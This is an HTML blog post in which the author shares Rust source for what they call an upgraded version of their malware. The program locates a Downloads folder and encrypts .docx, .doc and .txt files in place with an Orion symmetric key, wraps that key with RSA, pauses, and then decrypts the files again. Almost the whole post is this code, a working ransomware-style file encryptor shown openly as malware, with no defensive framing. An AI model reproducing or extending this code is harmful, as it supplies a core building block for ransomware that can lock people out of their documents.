<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upgrade</title>
    <link rel="stylesheet" href="../../style.css">
</head>

<body>
    <!-- Bubbles -->
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>

    <!-- Blog Post Container -->
    <article class="blog-post-container">
        <!-- Post Header -->
        <header class="post-header">
            <a href="rust-blog.html" class="back-link">← Back to Rust Blog</a>
            <h1 class="post-title">Hybrid Encryption in Rust: RSA + Orion
            </h1>
            <div class="post-info">
                <span>Dec 27, 2025</span>
            </div>
        </header>

        <!-- Post Content -->
        <div class="post-content">
            <p>Here is the upgraded version of the malware i made. I will probably come back to this later but I made a
                hybrid encryption version. This one uses the orion and rsa crates. I use the orion key to encrypt
                becuase its better for big files. The issue is that orion is symmetric, so to get around that I used the
                rsa public key to encrypt the orion key. Time to rest my eyes</p>

            <pre><code>use std::collections::btree_map::Values;
use std::env;
use std::path;
use std::string;
//for writing to file i think
use orion::aead;
use orion::hazardous::aead::streaming::SecretKey;
use orion::kex::PublicKey;
use rand::random;

// sticking with orion instead
use rsa::{Error, Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
use std::fs;
use std::io;
use std::path::Path;
use std::path::PathBuf;
use std::thread::sleep;
use std::time::{Duration, SystemTime};
use walkdir::WalkDir;

pub fn main() {
    let path = find_dirs_recursively();
    println!("this is the {}", path);
    print!("generating key");
    let key: (RsaPublicKey, RsaPrivateKey, orion::aead::SecretKey) = generate_key();
    let (publickey, privatekey, orionsecretkey) = key;
    print!("Encrypting the files");
    let orion_pub_key = encryption(&path, &publickey, &orionsecretkey);

    println!("stopping time so to see inf encrypted");
    //timer so i have time to check encryption
    let now = SystemTime::now();
    sleep(Duration::new(10, 0));
    match now.elapsed() {
        Ok(elapsed) => {
            // it prints '2'
            println!("{}", elapsed.as_secs());
        }
        Err(e) => {
            // an error occurred!
            println!("Error: {e:?}");
        }
    }

    println!("Decrypting");
    decryption(orion_pub_key, privatekey, &path);
}

fn find_dirs_recursively() -> String {
    let mut current_dir = env::current_dir().expect("failed to get current dir ;n;");
    //the folder we want
    let dirname = "Downloads";
    let mut string_path: Option&lt;String&gt; = None;

    // 2. Start the loop
    for entry_result in WalkDir::new(current_dir) {
        // 3. Open the "Result" envelope
        if let Ok(entry) = entry_result {
            // 4. Check the metadata (is it a folder?)
            if entry.metadata().unwrap().is_dir() {
                // 5. Check if the name matches
                // to_string_lossy seems to be used for making sure the program doesn't mess up
                // when using different formats. Mainly between linux and windows I thing
                // filename just returns the file name
                let name = entry.file_name().to_string_lossy();
                if name.contains(dirname) {
                    // 6. Add it to our box
                    // old mistake. I used let string_path, making a new temp variable. I removed let
                    //update added some here and changed string_path to none becuase I couldn't set it to a empty string
                    string_path = Some(entry.path().to_string_lossy().to_string());
                    break;
                }
            }
        }
    }

    // 7. Return the box
    if let Some(path) = string_path {
        path // If it was Some, return the path
    } else {
        "Folder not found".to_string() // If it was None, return this
    }
}

// so what happend was that I had the variable get stuck inside the loop and i needed to get it out.
//I first tried to make sting path an empty string but rust didn't like that so i made it none instead
//I was till stuck with it in the loop so I added the break statement that could end the loop at store it in the var
// but i needed to check if I actually got something. SO i did a match to check if the something is actually there. if its
//not it will return that as a string

// following guide for rsa in rust. https://crates.io/crates/rsa
// Learning that rsa can take a while for bigger data but in this case it should work
fn generate_key() -> (RsaPublicKey, RsaPrivateKey, orion::aead::SecretKey) {
    let mut rng = rand::thread_rng(); // rand@0.8
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let pub_key = RsaPublicKey::from(&priv_key);
    //updating. becuase rsa is bad for large files im swithcing to a hybrid approach
    //going to use orion to encrypt and use the public key to encrypt the orion key
    // Generate a random key for Orion
    let orion_session_key = aead::SecretKey::default();

    //will need to unpack
    (pub_key, priv_key, orion_session_key)
}

// encryption function. Will walk through a given dir and encrypt files, saving to ram isntead of disk
fn encryption(
    file_dir: &String,
    public_key: &RsaPublicKey,
    orionkey: &orion::aead::SecretKey,
) -> Result&lt;Vec&lt;u8&gt;, Error&gt; {
    //will walk through the dir and find all files with certain endings
    let mut valid_endings = ["docx", "doc", "txt"];

    let mut rng = rand::thread_rng();
    let bits = 2048;

    // iterate through the dir, prob for loop
    for entry in fs::read_dir(file_dir).expect("Cant read dir") {
        let the_file = entry.expect("cant read file");

        // converts the file part to a path
        let file_pth = the_file.path();
        //converts to string to check endings
        let file_pth_str = file_pth.to_string_lossy();

        // This took some time jesus christ but here is how to get the extension

        let extension: String = file_pth_str
            .chars() // 1. Turn into characters
            .rev() // 2. Flip it:
            .take_while(|c| *c != '.') // 3. Keep going until there is '.'
            .collect::&lt;String&gt;() // 4. Collect what was found: "xcod"
            .chars() // 5. Turn "xcod" into characters
            .rev() // 6. Flip it back: "docx"
            .collect(); // 7. Final String

        //keep in mind that rsa can be bad for big files
        // original idea was to use extension as the parameter but I can't since it expects a &, so I just added & to extension but that didn't work
        // It turns out that the valid_extension list are pointers and strs.
        // container wants an item in a list, the items in my list are pointers
        // i need to point to extension which contain will then point to the valid list, pointer to a pointer
        // but i first need to make extension a str
        if valid_endings.contains(&extension.as_str()) {
            //gets path from the file
            let path = the_file.path();
            // reads the data from file
            let plaintext = fs::read(&path).expect("Failed to read file");
            // encrypt with orion key
            let encrypted_text = aead::seal(&orionkey, &plaintext).expect("Failed to encrypt file");

            // Write the encrypted data back to the file
            fs::write(&path, &encrypted_text).expect("Failed to write encrypted file");
        }
    }

    // needs to return encrypted encrypted orioin key
    // the issue was the mis matching of types. to get around this i change the key to bytes
    // maybe not safe if an attacker can stop the program at this exact point
    let raw_orion_key_bytes = orionkey.unprotected_as_bytes();

    //now encrypts the orion key with the rsa public key
    let ras_orion_key = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, raw_orion_key_bytes);

    ras_orion_key
    // check if the ending is in the valid endings slice

    // if it is encrypt them
}

fn decryption(
    pub_enc_orion_key: Result&lt;Vec&lt;u8&gt;, Error&gt;,
    rsa_private_key: RsaPrivateKey,
    file_dir: &String,
) {
    //first need to unpack orion key
    let unpacker_orion_key = pub_enc_orion_key.unwrap();

    // Decrypt the Orion key using RSA private key
    let decrypted_orion_key = rsa_private_key
        .decrypt(Pkcs1v15Encrypt, &unpacker_orion_key)
        .expect("Failed to decrypt Orion key...Failed to decrypt....dude we are so fcked");

    // Reconstruct the Orion SecretKey from the decrypted bytes
    let orion_key =
        orion::aead::SecretKey::from_slice(&decrypted_orion_key).expect("Invalid Orion key");

    //iterates through dir for decryption
    // i rea;;y should have made this a function but im in too deep right now
    let mut valid_endings = ["docx", "doc", "txt"];

    // iterate through the dir, prob for loop
    for entry in fs::read_dir(file_dir).expect("Cant read dir") {
        let the_file = entry.expect("cant read file");

        // converts the file part to a path
        let file_pth = the_file.path();
        //converts to string to check endings
        let file_pth_str = file_pth.to_string_lossy();

        // This took some time jesus christ but here is how to get the extension

        let extension: String = file_pth_str
            .chars() // 1. Turn into characters
            .rev() // 2. Flip it:
            .take_while(|c| *c != '.') // 3. Keep going until there is '.'
            .collect::&lt;String&gt;() // 4. Collect what was found: "xcod"
            .chars() // 5. Turn "xcod" into characters
            .rev() // 6. Flip it back: "docx"
            .collect(); // 7. Final String

        if valid_endings.contains(&extension.as_str()) {
            // decrypts
            //gets path from the file
            let path = the_file.path();
            // reads the encrypted data from file
            let encrypted_data = fs::read(&path).expect("Failed to read encrypted file");

            // Decrypt with Orion key
            let decrypted_data =
                aead::open(&orion_key, &encrypted_data).expect("Failed to decrypt file");

            // Write the decrypted data back to the file
            fs::write(&path, &decrypted_data).expect("Failed to write decrypted file");
        }
    }
}</code></pre>
        </div>

        <!-- Post Footer -->
        <footer class="post-footer">
            <a href="rust-blog.html" class="back-link">← Back to Rust Blog</a>
        </footer>
    </article>
</body>

</html>